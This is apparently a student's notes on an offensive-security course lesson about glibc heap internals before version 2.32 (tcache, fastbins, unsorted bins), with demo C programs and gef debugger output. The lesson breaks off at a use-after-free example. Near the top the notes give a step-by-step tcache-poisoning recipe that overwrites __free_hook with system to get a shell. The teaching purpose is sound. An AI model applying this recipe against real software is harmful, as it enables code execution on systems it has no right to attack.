useful explanations:
- https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/

heap and cache
- allocating heap 
- freeing heap - order? 
	- relation to cache
heap bins
- for recycling allocated memory
- different types of bins store pointers to different sized blocks on memory on heap
	- which bins a block of memory goes into depends on the block's size
- bins are implemented using linked lists
- tcache are highest priority - they get looked at first before other bins
- small, large and unsorted bins are DOUBLY linked lists
	- circular linked list
beware of how top chunk pointer changes when a big block of mem gets freed
- IF this big block of mem does border the top chunk (top of heap), then instead of caching the mem block, top chunk pointer simply drops down below this big block. Next time we request heap mem, it'll just start eating upwards into this big block mem
- trick to prevent top chunk pointer from dropping ("consolidation"): allocate on heap sth above the big block so the big block no longer borders top chunk

Key point
- freed memory get put into bins, into data structure called linked lists
- they contain linked list ptrs (to point to the next item)
- accessing these linked list ptrs allows us to read/change things
	- we could change the linked list pointers


Steps to pop a shell:
	1. Leak a glibc address, perhaps via a freed unsorted bins allocation with a `main_arena` pointer in its linked list
	2. Use a heap memory corruption primitive (UAF, heap buffer overflow, etc.) to poison tcache so that the address of a freed `fw` pointer now points to `__free_hook`
	3. Allocate enough items from the corrupted bin so that `__free_hook` is returned as a pointer to an allocation we can control
	4. Overwrite the value at `__free_hook` to be the address of `system`
		1. technique: tcache poisoning 
			1. take advantage of the program. Does it have code / functions that allows us to overwrite values at given addresses?
	5. Set another allocation's data to start with `/bin/sh\0` (make sure we have a null-terminator here)
	6. Free the allocation from above. The call to `free` will check `__free_hook`, which is now populated. Glibc therefore calls the function at free hook with the pointer address to be freed, leading to a call to `system("/bin/sh\0")`






Our attacks thus far have focused primarily on the stack, with a brief foray into hijacking execution in the GOT. However we now have experience with how modern mitigations affect our ability to leverage primitives and hijack execution. Stack-based vulnerabilities can quickly be identified with _static analysis_ because the stack is a fixed, predictable size. Primitives can be characterized with tools like [CodeQL](https://github.blog/developer-skills/github/codeql-zero-to-hero-part-1-the-fundamentals-of-static-analysis-for-vulnerability-research/) or IDA/Ghidra/Binja scripts. This allows targets to be analyzed quickly and in large quantities so that bugs can be identified and patched. Furthermore, the tactics used thus far can be easily squashed with specific compilation flags, some of which have become default choices.

Enter the heap, the wild west of user space and kernel land. Whereas the stack is fixed and predictable, the heap can be chaotic and nebulous. This characteristic means it is much harder to find bugs with static analysis, and heap vulnerabilities continue to result in countless CVEs and real-world exploits.

Though the heap can be chaotic, it is deterministic—the same series of operations will incur the same responses. The heap state will be the same (aside from perhaps a different randomized base) so long as our invocations remain the same. With a bit of understanding of its internal functionality, we can learn to leverage this characteristic to our advantage.

Table of Contents

- [[#Understanding the Heap]]

## Understanding the Heap

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#understanding-the-heap)

The heap, like the stack, is a scratch space for a program. The stack is a scratch space for functions that use fixed-size allocations—static, fixed-length arrays, primitive types like `int`s and `long`s, and pointers. However, programs need the flexibility to allocate variable length data based on the program context and user needs. This is where the heap comes in.

A program requests data from the heap through allocation functions `malloc`, `calloc`, and `realloc`. The `man` pages have detailed information about each. The difference between them is that `calloc` zeroes out allocated memory (which is not ideal for some of our heap primitives), and realloc may result in `free` ing and allocating new memory (more on `free` below). But, at a high level, the functions perform the same end goal: request and receive a heap _allocation_ containing a number of bytes in a linear buffer on the heap.
- calloc
	- supply the number of bytes per block  AND  how many blocks
	- zeroes out the memory that's allocated
- malloc
	- supply number of bytes
	- does NOT zero out the allocated memory
	- returns a pointer to this block of memory



> These allocations are sometimes referred to as "chunks," but this term is overloaded to mean other things in different heap implementations. These lessons will try to avoid "chunk," instead referring to the groups of heap data as "allocations."

This allocated data can be used as needed. The simplest thing we can do with heap memory is write a byte string to the data and use it later for printing or parsing. We can also treat the buffer as a more complex series of bytes, such as an array of integers which can set and access offsets into the buffer based on each array index. A very common use of heap objects is for structures. We can interpret the dynamically allocated bytes as the different members of a structure to fetch data at their respective offsets into the struct (buffer).

Heap allocations are also frequently used for long-lived structures like program context info or state machines (think about a connection to a client on an HTTP server). We frequently see `malloc(sizeof(struct X))` to allocate that structure, update it, and pass it between functions. This is an advantage to us when reverse engineering, as the allocation sizes inform us of the structure size.
- `malloc(sizeof(struct X))`
	- give me a block of memory the size of this struct


> Long-lived data is commonly stored on the heap for C/C++ programs. This differs in Rust, which has lifetimes, vetted by the borrow checker, that allow for long-lived stack allocations. This can make Rust binaries a lot more painstaking to reverse engineer.

The lifetime of a heap allocation is not necessarily tied to a specific function; it is not uncommon for programs to release the allocated memory in different control flows based on the internal state. Whenever a program no longer needs the allocated data, it can release it with a call to `free`. `Free`d allocations are often cached so they can be reused later for new allocations. `free`ing data is important—it releases data so that long-running programs need not worry about running out of heap memory. But incorrect `free`s also lead to some very significant security issues, as we will cover shortly.

### Heap Implementations

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#heap-implementations)

Philosophically the heap is just a computer science concept used for dynamically allocated data; its implementation is up to the operating system (for kernel allocations) or its C-standard library (for user-level applications). There are decisions to be made about how freed items are reallocated—e.g., do we use a ["first fit" or "best fit"](https://courses.grainger.illinois.edu/cs240/sp2021/notes/heapMemoryAllocation.html#:~:text=First%2Dfit%20is%20faster%2C%20allowing,every%20free%20block%20in%20memory)methodology—how the cached lists are maintained, and where heap state data is stored. There are no "right" answers to these design questions and one implementation might be significantly better or worse depending on the use case. But understanding these details is pivotal to classifying heap primitives and knowing how to use them during exploitation.

There are a variety of notable heap implementations through the years, including `jemalloc` (Firefox, Facebook, Android apps, FreeBSD), `tcmalloc` (Google, Safari), and `ptmalloc` (glibc). We will specifically focus on `ptmalloc`'s implementation, which forms the basis of glibc's heap allocator.

### glibc's Heap

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#glibcs-heap)

##### Allocating Data

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#allocating-data)

> The following sections use `gef`-specific heap commands to visualize the heap. `pwn-dbg` and `peda-heap` have commands to perform similar functionality.

The glibc heap has some interesting (and useful) quirks about its implementation, and it's useful to understand the design choices made to better comprehend the heap primitives we cover next. The heap is treated as a large block of data which is initially allocated through a call to `sbrk`. This grabs a number of memory pages from the operating system which it uses as a scratch space for the program. From then on, the heap can be thought of as a large memory space which consists of used and unused portions. Unused portions have two flavors: allocations which were previously used and freed, or "yet to be allocated" data. The heap maintains a pointer to the "top" of the heap (the heap grows upwards) that points to the start of all "yet to be allocated" data called _top chunk_. Whenever an allocation request cannot be fulfilled by a previously freed allocation it is fetched from the top of the heap and top chunk moves upward accordingly.
- minimum amount of memory dished out by OS: 0x1000
	- that's why glibc's base addr ends in 000
- when you malloc a block of memory, we add 8 bytes of metadata about this block of mem
	- the "size" shown on gef "heap chunks" does not just include the requested # bytes, but also the metadata bytes and any padding bytes 



This is most evident when making allocations with a fresh heap. When there are no previously freed allocations, the only place to allocate from is the top of the heap. Let's consider the following short program, [[allocations.c]] and the resulting heap:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

int main() {
    // allocate a variety of sizes
    void* arr[37];
    for (int i = 0; i < 37; i++) {
        arr[i] = malloc(i * 7);
    }
    void *kinda_big = malloc(0x300);
    void *big = malloc(0x408);
    void *really_big = malloc(0x409);
    return 0;
}
```

Let's use `gef` to print out a visualization of the heap at the end of [[allocations]] with the `heap chunks` command (there's the "chunk" word again...):

```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592e0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559300, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559300     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559320, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559320     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559350, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559350     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559380, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559380     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555593c0, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555593c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559400, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559400     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]

... snip ...

Chunk(addr=0x55555555a420, size=0x100, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555a420     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555a520, size=0x100, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555a520     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555a620, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555a620     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555a730, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555a730     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555aa40, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555aa40     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555ae50, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555ae50     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555b270, size=0x1eda0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

Let's quickly address this first allocation with size `0x290`. This is a structure called the `tcache_perthread_struct` and it is [the first thing allocated on the heap](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3246). Its purpose is to record the state of the `tcache` cache, which we'll talk about in the [[#Caches]]] section below. For now we'll ignore it.

The following allocations are those requested by our series of calls to `malloc`. What we see is that the first four allocations, sized `0x0, 0x7, 0xe,` and `0x15` are all provided with a `0x20`-sized allocation. Next, the `0x1c` and `0x23` get a `0x30`-byte allocation. Moving on, the `0x2a`, `0x31`, and `0x38` requests get `0x40` bytes. This pattern more or less continues for the allocations in the `for` loop.

What's the logic behind the request and received size? There are two contributing factors. The first is that the glibc heap needs aligned pointers for its heap allocations to facilitate faster traversing and some security checks. For that reason we generally receive some extra bytes to pad the end of each allocation to a 16-byte aligned address. The second reason is that glibc has _inline metadata_. This means it stores information about the allocation within the heap, specifically right before the allocation. Eight bytes are dedicated to a logical OR (`|`) of:

1. The allocation size
2. Whether the previous allocation is in use (`PREV_IN_USE`)
3. Whether the allocation is in a non-standard address range (`NON_MAIN_ARENA`)
4. Whether the allocation is `mmap`d (`IS_MMAPPED`)

The result is an algorithm where `size returned = ((size requested + 7) & ~0xf) + 0x10`. We see this is the same logic even for the bigger allocations, where `0x300` gets `0x310`, `0x408` gets `0x410` and `0x409` gets `0x420`.

> The exception is the first four allocations, which all fall in the `0x20` bucket. This is because glibc has defined the smallest possible allocation size as `0x20` bytes, so any request `0x18` bytes or smaller fits into that minimum size.

This rule holds when trying to allocate from a cached, previously freed area of memory. But to understand that algorithm, we need to understand how the caches are configured when an object is freed.

### Caches
- on-heap caches
- cache contains pointers to FREED memory
	- if later, we request memory on the heap, glibc will take blocks of memory already allocated on the cache
- cache is Last in first out like a stack

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#caches)

Freed allocations are maintained in caches so that they can be quickly checked when trying to fulfill future allocations. There are three different "types" of caches and each has different purposes and behaviors.

The first is called `tcache` which is a thread-specific cache. These are limited-capacity caches for commonly used allocation sizes. The philosophy for these caches is that programs allocate ephemeral objects of relatively similar size that are frequently used, freed, and reallocated. Thread-specific caches avoid lock acquisition and contention, theoretically improving performance. Thus, the tcache cache has the highest priority when storing a [freed pointer](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4518) and [allocating from a cache](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3320). But having too much cache capacity could lead to wasted space if the thread does not frequently need a similarly sized allocation. Therefore, by default tcache limits each cache to a max of seven entries. Glibc's default tcache has 64 cache sizes: `0x20` bytes, `0x30`, `0x40`, `0x50`...all the way up to `0x410` in `0x10` byte increments. We'll discuss more specifics of the tcache implementation in the next section.

The next category is `fastbins`. Before tcache existed, fastbins was used to cache small allocations for quick reuse. Fastbins is limited to small allocations, as allocations in this range have a high probability of being used, freed, and reused in most programs. The seven sizes are `0x20`, `0x30`, `0x40`, `0x50`, `0x60`, `0x70`, `0x80`. Fastbins has the next highest priority for [caching](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4561) and [allocating](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3914), after the tcache bins of these corresponding sizes are full. Because it is not thread-specific, any thread can search the fastbins caches for a matching allocation.

If we free an allocation that does not fit into fastbins or tcache (or tcache is full), a separate routine runs which tries to [merge neighboring freed allocations](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4664). This is a form of defragmenting the available memory on the heap so that it can field a wider range of future allocation requests. After any potential merging occurs, the resulting freed memory region [winds up in the `unsorted bins`](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4732). This is a lazy methodology: why organize the value now when it might be immediately used for the next allocation? The unsorted bins is the Island of Misfit Toys for the heap—it is an unsorted collection of all chunks not currently in a sized cache. It's worth noting that if we reach this control flow path there is a final check to see whether the allocation being freed borders top chunk. If so, there is no point in caching it—we can instead just merge it into top chunk and move the pointer down, preventing fragmentation altogether. This [top chunk consolidation](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4753) is very important to remember when developing exploits, because it can be the difference between us leaking an intended value and having our memory swallowed by top chunk.

There is one final grouping of caches, but for that we need to create a scenario where there are a handful of large-ish freed allocations in unsorted bins. Since unsorted bins lazily waits for a future allocation before parsing its entries, we need to trigger this behavior with an allocation that cannot be fulfilled by either tcache or fastbins. The unsorted allocations are [sorted into `smallbins` and `largebins`](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4161) based on their size. Small bins are also grouped in `0x10`-byte increments from `0x20` to `0x3f0` bytes. Largebins covers everything `0x400` and larger.

### Linked Lists

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#linked-lists)

> This is where specifics differ from glibc <v.2.32 versus glibc v2.32+. It is extremely important that we use an operating system running older versions of glibc (e.g., Ubuntu 20.04, as of July 2024) or an appropriate Docker container to continue our research for the rest of this module. Use `ldd --version` to validate the system's glibc version, as shown below:
> 
> ```shell
> root@offsec-20-04:~# ldd --version
> ```
- Takeaway: 
	- our chals require glibc to have older version < 2.32



**Glibc uses linked lists to keep track of freed allocations in the different bins.** The linked list implementation varies based on the cache at hand, so we'll break down each type separately as we did above. But first, let's discuss _where_ we store the linked list information. Since each freed allocation is essentially "not needed" by the program, the bytes in the allocation are freely available. Consequently, glibc can use the bytes in the data buffer for whatever it wants, including linked list pointers. This is referred to as _inline metadata_, and is a specific feature of glibc that is not common to all heap implementations (e.g., jemalloc specifically does not use inline metadata). This decision is why glibc chooses a minimum `0x20` bytes for an allocation; it requires eight bytes for the allocation metadata, eight bytes for a linked list pointer, and eight bytes for _another use_. We'll talk about that use below (note: it changes based on the glibc version).

As previously mentioned, tcache is managed by `tcache_perthread_struct` which maintains a count of the cached entries in each bin and a pointer to the head of the list. The list is _singly linked_, so the head points to the next item in the list. New entries are added to the top of the list, making this a last in, first out (LIFO) "stack." _This is an extremely important detail for some of our exploit strategies_. Tcached allocations point to the next item in its cache with the first eight bytes of the allocated buffer. The next eight bytes store a reference to `tcache_perthread_struct`'s address.

```
	       	          8 bytes                      8 bytes
cached     .____________________________.____________________________.
allocation |            fd              |  &tcache_perthread_struct. |
	       `----------------------------`----------------------------`
```

### Linked Lists in Memory

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#linked-lists-in-memory)

We can see currently cached information, including caches and linked list pointers using `gef`'s `heap bins` command. `gef`'s `heap chunk <ptr>` command gives more information on an allocation at address `<ptr>`. Dumping the bytes at the beginning of any freed allocation shows the linked list pointer, if it exists (the end of tcache and fastbins bins will be `NULL`) and dumping eight bytes _prior_ to the address shows the size and `FLAGS` metadata.

Let's look at how each cache is actually represented within memory, starting with tcache. Let's fill tcache by allocating and freeing seven allocations, as shown in [[tcache.c]]:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

// need a size that fits in fastbins (<0x78 bytes)
#define SIZE 0x40
// free seven allocations to fill tcache
#define COUNT 7

int main() {
    void* arr[COUNT];
    // allocate
    for (int i = 0; i < COUNT; i++) {
        arr[i] = malloc(SIZE);
    }
    // free
    for (int i = 0; i < COUNT; i++) {
        free(arr[i]);
    }
    return 0;
}
```

Load [[tcache]] in GDB and break after freeing the allocations. Running `gef`'s heap commands shows that the tcache bin index three is full.

```
────────────────────────── Tcachebins for thread 1 ──────────────────────────────
Tcachebins[idx=3, size=0x50, count=7] ←  Chunk(addr=0x555555559480, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559430, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555593e0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559390, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559340, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592f0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592a0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
──────────────────── Fastbins for arena at 0x7ffff7dfeca0 ───────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────── Unsorted Bin for arena at 0x7ffff7dfeca0 ─────────────────────
[+] Found 0 chunks in unsorted bin.
─────────────────── Small Bins for arena at 0x7ffff7dfeca0 ──────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
─────────────────── Large Bins for arena at 0x7ffff7dfeca0 ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

And inspecting an allocation in the cache, say `0x555555559480`, shows more info on it. We can also dump the memory at and before this address to see the physical linked list pointers and metadata:

```
gef➤  heap chunk 0x555555559480
Chunk(addr=0x555555559480, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Chunk size: 80 (0x50)
Usable size: 72 (0x48)
Previous chunk size: 0 (0x0)
PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA

gef➤  x/8xg 0x555555559480
0x555555559480:	0x0000555555559840	0x0000555555559010
0x555555559490:	0x0000000000000000	0x0000000000000000
0x5555555594a0:	0x0000000000000000	0x0000000000000000
0x5555555594b0:	0x0000000000000000	0x0000000000000000
gef➤  x/4xg 0x555555559480-0x10
0x555555559470:	0x0000000000000000	0x0000000000000051
0x555555559480:	0x0000555555559840	0x0000555555559010
```

Fastbins is similarly implemented, except that the second quadword in the data section of the allocation is not used; it simply maintains the metadata and a forward pointer to the next item. Like tcache, fastbins are last in, first out (LIFO) stacks. Unlike tcache, the head of each bin is stored in the heap's `main_arena` struct, which is of type [`malloc_state`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L1668). This structure is allocated statically in glibc (_not_ on the heap). Remember that fastbins is only used when the matching tcache bins are full, so we need to allocate and free more than seven small allocations to get some in fastbins. Consider the following [[fastbins.c]] program:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

// need a size that fits in fastbins (<0x78 bytes)
#define SIZE 0x40
// need more than 7 allocations to use fastbins, need more than 8 to have a
// pointer in the top of the fastbins cache
#define COUNT 10

int main() {
    void* arr[COUNT];
    for (int i = 0; i < COUNT; i++) {
        arr[i] = malloc(SIZE);
    }
    for (int i = 0; i < COUNT; i++) {
        free(arr[i]);
    }
    // breakpoint at this return and inspect with `heap bins`

    // next, exhaust tcache to later pull from fastbins
    for (int i = 0; i < 7; i++) {
        arr[i] = malloc(SIZE);
    }
    // next pointer will be the top of fastbins
    arr[7] = malloc(SIZE);
    return 0;
}
```

Breakpointing on [[fastbins]] after allocating and freeing the items, we see tcache bin index three (size `0x50`) is full and the remaining three freed allocations are in fastbins.

```
gef➤  heap bins
────────────────────────── Tcachebins for thread 1 ──────────────────────────────
Tcachebins[idx=3, size=0x50, count=7] ←  Chunk(addr=0x555555559480, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559430, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555593e0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559390, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559340, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592f0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592a0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
──────────────────── Fastbins for arena at 0x7ffff7fbcb80 ───────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50]  ←  Chunk(addr=0x555555559570, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559520, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555594d0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```

We can fetch from fastbins by first allocating all seven items from tcache (since it gets priority) and then allocating an eighth item, which pulls from the top of fastbins. The snippet below shows the return value for that eighth allocation, which `gef` identified above as the top of fastbins:

```
──────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555521b <main+0092>      jle    0x5555555551fc <main+115>
   0x55555555521d <main+0094>      mov    edi, 0x40
   0x555555555222 <main+0099>      call   0x555555555090 <malloc@plt>
 → 0x555555555227 <main+009e>      mov    QWORD PTR [rbp-0x28], rax
   0x55555555522b <main+00a2>      mov    eax, 0x0
   0x555555555230 <main+00a7>      mov    rcx, QWORD PTR [rbp-0x8]
   0x555555555234 <main+00ab>      xor    rcx, QWORD PTR fs:0x28
   0x55555555523d <main+00b4>      je     0x555555555244 <main+187>
   0x55555555523f <main+00b6>      call   0x555555555080 <__stack_chk_fail@plt>
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555227 → main()
─────────────────────────────────────────────────────────────────────────────────
gef➤  p/x $rax
$3 = 0x555555559570
```

Similarly, small and large bins have their list heads stored in [`malloc_state->bins`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L1677). However, small and large bins are actually doubly linked lists with both `fw` (forward) and `bk` (back) pointers. Unsorted bins is the same, and the head to that unsorted linked list is actually stored in `malloc_state->bins[0]`. Allocating and freeing a single item shows that both pointers point to glibc (which will be important in the next sections). Allocating and freeing another large allocation adds to the list, so that the forward and back pointers are a mixture of glibc and heap addresses. _Note that we need a "guard" allocation between the large freed allocation and top chunk, otherwise we trigger consolidation code which reclaims the entire chunk and bypasses caching!_ Let's take a look at this with [[unsorted_bins.c]]

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

// need a size that is bigger than tcache (>0x408 bytes)
#define SIZE 0x409

int main() {
    void* big_allocation = malloc(SIZE);
    // guard page to avoid consolidating big allocations together
    void* guard = malloc(0x20);
    void* big_allocation_2 = malloc(SIZE);
    // guard page to avoid consolidating into top chunk
    void* guard2 = malloc(0x20);
    // guard page to avoid consolidating big allocations together
    // freeing this allocation moves it to unsorted bins, with fw and bk
    // pointers to a glibc address
    free(big_allocation);
    // freeing the second allocation moves it to the front of unsorted bins with
    // a fw pointer to the previously freed allocation
    free(big_allocation_2);
    return 0;
}
```

Breaking on [[unsorted_bins]] after the first free shows the linked list pointers, which point to a glibc address:

```
gef➤  heap bins
────────────────────────── Tcachebins for thread 1 ──────────────────────────────
All tcachebins are empty
──────────────────── Fastbins for arena at 0x7ffff7fbcb80 ───────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────── Unsorted Bin for arena at 0x7ffff7fbcb80 ─────────────────────
[+] unsorted_bins[0]: fw=0x555555559290, bk=0x555555559290
 →   Chunk(addr=0x5555555592a0, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
─────────────────── Small Bins for arena at 0x7ffff7fbcb80 ──────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
─────────────────── Large Bins for arena at 0x7ffff7fbcb80 ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/2xg 0x5555555592a0
0x5555555592a0:	0x00007ffff7fbcbe0	0x00007ffff7fbcbe0
gef➤  vmmap 0x00007ffff7fbcbe0
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffff7fbc000 0x00007ffff7fbe000 0x00000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
```

And breaking after the second free shows that this second freed allocation is at the top of the list, with a pointer to the first freed allocation's address:

```
────────────────── Unsorted Bin for arena at 0x7ffff7fbcb80 ─────────────────────
[+] unsorted_bins[0]: fw=0x5555555596e0, bk=0x555555559290
 →   Chunk(addr=0x5555555596f0, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x5555555592a0, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
─────────────────── Small Bins for arena at 0x7ffff7fbcb80 ──────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
─────────────────── Large Bins for arena at 0x7ffff7fbcb80 ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/2xg 0x5555555596f0
0x5555555596f0:	0x0000555555559290	0x00007ffff7fbcbe0
gef➤  x/2xg 0x0000555555559290+0x10
0x5555555592a0:	0x00007ffff7fbcbe0	0x00005555555596e0
```

> One important consideration here is that smallbins, largebins, and unsorted bins store pointers to `0x10` bytes _before the next cached allocation_, not to the next allocation's data like the other caches. `gef` automatically resolves this for us in the bin representation (`0x5555555596f0` points to `0x5555555592a0`), but the data in memory is actually `0x10` bytes before that address (`0x5555555596f0` points to `0x0000555555559290`, and `0x5555555592a0` points back to `0x00005555555596e0`). Glibc automatically resolves this `0x10` byte delta when it returns values from `malloc` and frees the address with `free`, but it is important to note this during exploitation if we want to leak or corrupt these addresses.

## Use After Frees (UAF)

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#use-after-frees)

Before we can understand heap exploitation primitives, we need to understand one particular vulnerability type specific to heaps. A use-after free (UAF) error occurs when a program frees an allocation but does not null-out the pointer which held its address. The result is a situation in which the user can potentially manipulate a value on the heap that is no longer treated by the heap as "in use." Consider the following snippets from [[uaf.c]]:

```c
// ... snip ...
struct user {
